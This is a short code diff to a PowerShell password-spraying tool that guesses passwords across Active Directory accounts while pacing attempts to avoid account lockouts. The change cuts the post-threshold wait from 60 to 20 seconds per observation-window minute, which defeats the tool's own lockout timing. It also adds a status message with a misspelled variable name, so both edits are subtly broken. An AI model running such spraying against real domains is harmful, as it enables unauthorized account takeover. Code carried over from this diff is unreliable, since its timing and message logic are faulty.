@@ -250,7 +250,7 @@ function Invoke-DomainPasswordSpray{
     $password_count = $Passwords.count
     Write-Host -ForegroundColor Yellow "[*] Password spraying has begun with " $password_count " passwords"
     Write-Host "[*] This might take a while depending on the total number of users"
-    Write-Host "[*] threshold currently in use is $lockout_threshold, we will attempt 1 less tries than this"
+    Write-Host "[*] Threshold currently in use is $lockout_threshold, will attempt 1 less tries than this per $obersvation_window minutes"
 
     if($UsernameAsPassword)
     {
@@ -267,7 +267,7 @@ function Invoke-DomainPasswordSpray{
             if ($j -ge ($lockout_threshold - 1))
             {
                 $j = 0
-                Countdown-Timer -Seconds (60*$observation_window)
+                Countdown-Timer -Seconds (20*$observation_window)
             }
             else{
                 Countdown-Timer -Seconds (60)
@@ -616,7 +616,7 @@ function Get-LockoutThreshold($DomainEntry)
     $objDeDomain = [ADSI] "LDAP://$($DomainObject.PDCRoleOwner)"
     $AccountLockoutThresholds = @()
     $AccountLockoutThresholds += $objDeDomain.Properties.lockoutthreshold
-    
+
     [int]$SmallestLockoutThreshold = $AccountLockoutThresholds | sort | Select -First 1
 
     if ($SmallestLockoutThreshold -eq "0")
